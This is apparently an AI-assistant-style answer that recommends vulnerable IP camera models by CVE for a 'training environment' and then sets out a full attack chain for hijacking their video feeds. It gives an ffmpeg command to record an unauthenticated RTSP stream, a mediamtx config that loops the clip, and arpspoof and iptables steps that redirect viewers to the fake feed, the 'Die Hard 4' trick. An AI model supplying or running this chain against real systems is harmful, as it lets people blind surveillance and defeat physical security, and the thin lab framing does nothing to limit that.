Camera Recommendations (with known, documented CVEs)
For a controlled training environment, you want cameras with public, well-documented exploits so you control the difficulty level:
Easy Tier

Foscam FI8910W / R2 — multiple CVEs including auth bypass (CVE-2017-2849) and RTSP stream access without credentials. Very common, cheap used.
Hikvision DS-2CD series (pre-2017 firmware) — CVE-2017-7921, unauthenticated access to RTSP and snapshot endpoints. Extremely well documented.

Medium Tier

Dahua IPC-HDW series (old firmware) — CVE-2021-33044 auth bypass. Students need to craft the right request.
Axis M series (older) — various CVEs around the VAPIX API, good for teaching API-level exploitation.

Feed Manipulation / Loop Replay
This is the classic "Die Hard 4" move and it's very achievable. Here's the attack chain:

Step 1 — Access the RTSP stream
Most of these cameras expose an unauthenticated (or default-cred) RTSP stream:
rtsp://192.168.x.x:554/stream1

Step 2 — Record a clean segment
ffmpeg -i rtsp://[camera_ip]:554/stream1 -t 5 -c copy loop_clip.mp4
That grabs 5 seconds of "nothing happening" footage.

Step 3 — Replay the loop back to any viewer
You can use a simple RTSP server to rebroadcast the clip on loop. mediamtx (formerly rtsp-simple-server) works well:
# mediamtx.yml
paths:
  fake_feed:
    source: loop_clip.mp4
    sourceOnDemand: yes
    loop: yes

Then redirect the camera's outbound stream (via ARP spoof or routing manipulation on the exercise network) so any NVR or viewer pulling the feed gets your looped clip instead.

Step 4 — ARP spoof to intercept
arpspoof -i wlan0 -t [viewer_ip] [camera_ip]

Combined with iptables to redirect RTSP traffic to your mediamtx instance.


